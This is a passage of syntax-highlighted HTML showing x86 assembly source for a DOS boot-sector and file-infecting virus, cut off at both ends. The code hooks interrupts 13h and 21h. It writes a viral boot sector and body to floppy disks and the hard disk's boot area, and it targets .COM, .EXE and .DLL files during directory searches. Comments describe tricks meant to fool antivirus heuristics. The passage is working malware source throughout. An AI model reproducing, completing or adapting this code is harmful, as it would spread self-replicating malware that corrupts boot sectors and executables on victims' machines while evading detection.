</span><span class="sc5">seg13h</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">check_int21h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">],</span><span class="sc12">'M'</span><span class="sc0">    </span><span class="sc1">; longer but antiheuristic</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">end_21_check</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc12">'Z'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">end_21_check</span><span class="sc0">

</span><span class="sc5">force_int21h_set</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21set</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; 21 already set?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">end_21_check</span><span class="sc0">

                </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21set</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">; decrease counter</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">int21set</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">      </span><span class="sc1">; time to hook?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">end_21_check</span><span class="sc0">

                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                           </span><span class="sc1">; ds to ivt</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">

                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">086h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">           </span><span class="sc1">; set our int 21h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">seg21h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">new_int21h</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc2">084h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">off21h</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">

</span><span class="sc5">end_21_check</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">check_floppy</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">off13h</span><span class="sc0">             </span><span class="sc1">; read it</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">floppy_ok</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc10">error</span><span class="sc0">                           </span><span class="sc1">; exit on error</span><span class="sc0">
</span><span class="sc5">floppy_ok</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_check_int21h</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_int21h</span><span class="sc0">                    </span><span class="sc1">; check for int 21h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">leave_13h</span><span class="sc0">                       </span><span class="sc1">; installation</span><span class="sc0">

</span><span class="sc5">no_check_int21h</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">leave_13h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">leave_13h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">13h</span><span class="sc4">],</span><span class="sc2">2880</span><span class="sc0">       </span><span class="sc1">; only 1.44mb</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">leave_13h</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc2">2bh</span><span class="sc4">],</span><span class="sc12">'KP'</span><span class="sc0">       </span><span class="sc1">; label PKBACK...?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">leave_13h</span><span class="sc0">                       </span><span class="sc1">; if so, leave</span><span class="sc0">

</span><span class="sc5">boot_check</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">es</span><span class="sc4">:[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">boot_check</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'US'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">leave_13h</span><span class="sc0">                       </span><span class="sc1">; already inf?</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4f0ch</span><span class="sc0">        </span><span class="sc1">; cyl 79, sec 0ch</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">             </span><span class="sc1">; save original boot</span><span class="sc0">
                </span><span class="sc6">jnc</span><span class="sc0">     </span><span class="sc5">ok_write</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">leave_13h</span><span class="sc0">       </span><span class="sc1">; write protected, go away</span><span class="sc0">

</span><span class="sc5">ok_write</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">           </span><span class="sc1">; copy boot data</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_boot_data</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">fromfloppy</span><span class="sc4">],</span><span class="sc8">dh</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">           </span><span class="sc1">; put new boot</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; ax=301h</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">              </span><span class="sc1">; 3 sectors to write</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">         </span><span class="sc1">; body of the virus</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4f0dh</span><span class="sc0">        </span><span class="sc1">; d,e and f</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">

</span><span class="sc5">leave_13h</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
                </span><span class="sc6">popf</span><span class="sc0">
</span><span class="sc10">error</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">retf</span><span class="sc0">    </span><span class="sc2">2</span><span class="sc0">



</span><span class="sc5">infect_hd_by_13h</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">0201h</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filebuffer</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">             </span><span class="sc1">; read mbr to our buffer</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">table_check</span><span class="sc0">     </span><span class="sc1">; check partition table</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">inf_hd_err</span><span class="sc0">      </span><span class="sc1">; carry if error while looking at</span><span class="sc0">
                                        </span><span class="sc1">; the partition table</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">             </span><span class="sc1">; read boot sector</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">boot_check</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc12">'US'</span><span class="sc0">   </span><span class="sc1">; already infected?</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">inf_hd_err</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">copy_boot_data</span><span class="sc0">  </span><span class="sc1">; copy needed data from bs</span><span class="sc0">

                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">         </span><span class="sc1">; save original boot</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; save virus body</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">200h</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">fromfloppy</span><span class="sc4">+</span><span class="sc8">bp</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; hd marker</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc8">bp</span><span class="sc0">           </span><span class="sc1">; put virus boot</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

</span><span class="sc5">inf_hd_err</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">boot_end</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc2">01feh</span><span class="sc0">
</span><span class="sc5">boot_markers</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">055h</span><span class="sc4">,</span><span class="sc2">0aah</span><span class="sc0">

</span><span class="sc1">;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;</span><span class="sc0">

</span><span class="sc5">second_part_start</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">new_int21h</span><span class="sc4">:</span><span class="sc0">                                     </span><span class="sc1">; our int 21h handler</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4eh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">findfirst</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">4fh</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">findnext</span><span class="sc0">

                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                      </span><span class="sc1">; fool heuristics</span><span class="sc0">
                </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">004bh</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">do_int21h</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">execution</span><span class="sc0">

</span><span class="sc5">do_int21h</span><span class="sc4">:</span><span class="sc0">
         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">0EAh</span><span class="sc0">                           </span><span class="sc1">; original int 21h</span><span class="sc0">
</span><span class="sc5">off21h</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">seg21h</span><span class="sc0">   </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">findfirst</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc5">filename</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">   </span><span class="sc1">; offset of filename</span><span class="sc0">
                </span><span class="sc6">in</span><span class="sc0">      </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">40h</span><span class="sc0">
                </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0111b</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">   </span><span class="sc1">; infection counter</span><span class="sc0">
</span><span class="sc5">getpath</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">                           </span><span class="sc1">; save search path</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">pathexit</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">                           </span><span class="sc1">; es:di = filename</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">':'</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_sepa</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc13">'\'
</span><span class="sc0">                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">getpath</span><span class="sc0">
</span><span class="sc5">ok_sepa</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filenameoff</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">getpath</span><span class="sc0">
</span><span class="sc5">pathexit</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                      </span><span class="sc1">; restore regs</span><span class="sc0">
                </span><span class="sc6">popa</span><span class="sc0">
</span><span class="sc5">findnext</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:</span><span class="sc5">off21h</span><span class="sc0">

                </span><span class="sc6">pusha</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pushf</span><span class="sc0">

                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tmpcounter</span><span class="sc4">],</span><span class="sc2">07h</span><span class="sc0">
                </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">time_to_infect</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">tmpcounter</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">go_away</span><span class="sc0">
</span><span class="sc5">time_to_infect</span><span class="sc4">:</span><span class="sc0">

                </span><span class="sc6">cld</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">2fh</span><span class="sc0">                        </span><span class="sc1">; get DTA</span><span class="sc0">
                </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filenameoff</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">bx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc2">1eh</span><span class="sc0">                        </span><span class="sc1">; filename</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
</span><span class="sc5">getfname</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">lodsb</span><span class="sc0">
                </span><span class="sc6">stosb</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc12">'.'</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">isntadot</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc5">filedotoff</span><span class="sc4">],</span><span class="sc8">di</span><span class="sc0">   </span><span class="sc1">; save dot position</span><span class="sc0">
</span><span class="sc5">isntadot</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">               </span><span class="sc1">; end of filename?</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">getfname</span><span class="sc0">
             
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">filename</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,[</span><span class="sc5">filedotoff</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">tmpcounter</span><span class="sc4">],</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">founded_dot</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'OC'</span><span class="sc0">   </span><span class="sc1">; .com</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_inf</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">tmpcounter</span><span class="sc4">],</span><span class="sc2">01h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'XE'</span><span class="sc0">   </span><span class="sc1">; .exe</span><span class="sc0">
                </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">ok_inf</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc12">'LD'</span><span class="sc0">   </span><span class="sc1">; .dll</span><span class="sc0">
